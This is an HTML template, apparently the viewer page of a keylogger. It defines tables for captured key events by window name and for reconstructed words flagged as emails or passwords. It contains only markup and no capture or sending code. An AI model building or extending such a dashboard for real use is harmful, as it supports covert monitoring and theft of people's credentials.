{% extends "base.html" %}
{% block title %}Keylog View{% endblock %}
{% block content %}
<div class="container">

    <!-- View all keypresses -->
    <div id="keyAll" class="table-responsive">
        <h2>View all key events</h2>
        <div class="alert alert-success" id="keyall-success" style="visibility: hidden"></div>
        <table class="table table-striped table-bordered">
            <thead>
                <tr>
                    <th>datetime</th>
                    <th>isKeyDown</th>
                    <th>windowName</th>
                    <th>processedKey</th>
                </tr>
            </thead>
            <tbody>
            </tbody>
        </table>
    </div>

    <!-- View Words  -->
    <div id="wordAll">
        <h2>View all words pressed</h2>
        <div class="alert alert-success" id="showWordTable" style="visibility: hidden"></div>
        <table class="table table-striped table-bordered">
            <thead>
                <tr>
                    <th>datetime</th>
                    <th>windowName</th>
                    <th>processedWord</th>
                    <th>isEmail</th>
                    <th>isPassword</th>
                </tr>
            </thead>
            <tbody>
            </tbody>
        </table>
    </div>
